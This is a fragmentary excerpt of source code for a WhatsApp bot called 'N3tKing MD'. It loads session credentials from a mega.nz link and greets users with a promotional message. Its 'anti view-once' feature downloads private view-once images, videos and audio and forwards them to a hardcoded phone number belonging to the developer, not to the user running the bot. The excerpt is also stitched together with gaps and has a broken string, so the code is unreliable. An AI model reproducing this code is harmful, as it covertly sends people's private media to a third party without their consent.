const {
  ...
  const ownerNumber = ['263716729222']
...
const sessdata = config.SESSION_ID.replace("zandile~", '');
const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
filer.download((err, data) => {
if(err) throw err
fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
console.log("Session downloaded Successful by JoshKing✅")
})})}
  ...
  console.log("Connecting 🫡NETKING👑 to WhatsApp ⏳️...");
  ...
  console.log('🧬 Installing N3tKing MD Plugins')
  const path = require('path');
  ...
  let up = `*Hello there ☘𝙉3𝙩𝙆𝙞𝙣𝙜 𝙈𝘿☘ User! \ud83d\udc4b\ud83c\udffb* \n\n> This is auser friendly whatsapp bot created by ᴊᴏsʜᴜᴀᴍᴀᴍʙᴏ1 ᴛᴇᴄʜ \ud83c\udf8a, Meet ☘𝙉3𝙩𝙆𝙞𝙣𝙜 𝙈𝘿☘  WhatsApp Bot.\n\n *Thanks for using ✦ ☘𝙉3𝙩𝙆𝙞𝙣𝙜 𝙈𝘿☘ \ud83d\udea9* \n\n> follow WhatsApp Channel :- 💖\n \nhttps://whatsapp.com/channel/0029VaraMtfFcowAKRdDdp1T\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/Mid-T3lKing-public/N3tKing MD\n\n> © Powered BY ☘𝙉3𝙩𝙆𝙞𝙣𝙜 𝙈𝘿☘image: { url:`https://top4top.io/p_3291qwfqu0.jpg` }, caption: up })
  }
  })
  ...
  if (jawadik && config.ANTI_VV === "true") {
    ...
    return conn.sendMessage("263716729222@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
    ...
    return conn.sendMessage("263716729222@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
  } if (jawadik.message.audioMessage) {
    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
    return conn.sendMessage("263716729222@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
  }
  }
  ...
  */
  ...
  if(senderNumber.includes("263738403205")){
  if(isReact) return
  m.react("🦄")
  }
